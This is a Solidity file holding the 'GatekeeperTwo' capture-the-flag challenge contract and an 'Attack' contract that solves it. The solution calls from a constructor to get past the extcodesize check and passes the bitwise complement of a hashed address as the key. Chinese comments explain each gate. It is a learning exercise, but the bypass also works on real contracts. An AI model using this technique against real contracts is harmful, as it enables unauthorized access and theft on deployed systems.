// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attack{

    // one: 合约调用   two: 调用者代码大小为0    three: 二进制运算
    // X^Y = MAX   MAX=11111...111  那么 X和Y的进制完全相反 X[i]=0 那么Y[i]=1 
     constructor(address _addr) {
       bytes8 key = bytes8(keccak256(abi.encodePacked(address(this))));
       (bool success,) = _addr.call(abi.encodeWithSignature("enter(bytes8)", ~key));
     }
}